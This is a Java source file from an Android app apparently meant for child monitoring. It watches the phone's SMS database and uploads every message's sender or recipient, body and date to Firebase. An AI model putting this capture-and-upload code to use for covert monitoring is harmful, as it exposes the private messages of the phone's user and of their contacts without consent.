package com.childmonitorai;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSMonitor {
    private static final String TAG = "SMSMonitor";
    private String userId;
    private String phoneModel;
    private Context context;
    private BaseContentObserver smsObserver;

    public SMSMonitor(Context context, String userId, String phoneModel) {
        this.context = context;
        this.userId = userId;
        this.phoneModel = phoneModel;
    }

    public void startMonitoring() {
        // Check if permission is granted
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "READ_SMS permission not granted. SMS monitoring cannot start.");
            return;
        }

        // Create the ContentObserver to monitor changes in the SMS database
        smsObserver = new BaseContentObserver(context) {
            @Override
            protected void onContentChanged(Uri uri) {
                // Handle content change (new SMS)
                fetchSMS();
            }
        };

        // Register the ContentObserver to observe changes in the SMS database
        smsObserver.registerObserver(Uri.parse("content://sms"));

//        // Optional: Use periodic polling for fetching all SMS (if required)
//        final Handler handler = new Handler(Looper.getMainLooper());
//        Runnable runnable = new Runnable() {
//            @Override
//            public void run() {
//                fetchSMS();
//                handler.postDelayed(this, 60000); // Every minute
//            }
//        };
//        handler.post(runnable);
    }

    public void stopMonitoring() {
        // Unregister the ContentObserver when monitoring is stopped
        if (smsObserver != null) {
            smsObserver.unregisterObserver();
        }
    }

    private void fetchSMS() {
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    Uri.parse("content://sms"),
                    null, null, null, "date DESC");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    int typeColumnIndex = cursor.getColumnIndex("type");
                    int addressColumnIndex = cursor.getColumnIndex("address");
                    int bodyColumnIndex = cursor.getColumnIndex("body");
                    int dateColumnIndex = cursor.getColumnIndex("date");

                    if (typeColumnIndex != -1 && addressColumnIndex != -1 &&
                            bodyColumnIndex != -1 && dateColumnIndex != -1) {

                        String type = cursor.getString(typeColumnIndex); // Message type
                        String address = cursor.getString(addressColumnIndex); // Sender/Receiver
                        String body = cursor.getString(bodyColumnIndex); // Message body
                        long timestamp = cursor.getLong(dateColumnIndex); // Message timestamp
                        String smsDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(timestamp));

                        // Create SMSData object
                        SMSData smsData = new SMSData(type, address, body, smsDate);
                        smsData.setTimestamp(timestamp);

                        // Generate unique ID for SMS based on address and timestamp
                        String uniqueSMSId = generateUniqueId(address, timestamp);

                        // Upload SMS to Firebase
                        DatabaseHelper dbHelper = new DatabaseHelper();
                        dbHelper.uploadSMSDataByDate(userId, phoneModel, smsData, uniqueSMSId, smsDate);
                    } else {
                        Log.w(TAG, "Missing required columns in SMS log.");
                    }
                } while (cursor.moveToNext());
            }
        } catch (SecurityException se) {
            Log.e(TAG, "Permission denied: " + se.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error fetching SMS logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private String generateUniqueId(String address, long timestamp) {
        return address + "_" + timestamp; // Combination of address and timestamp
    }
}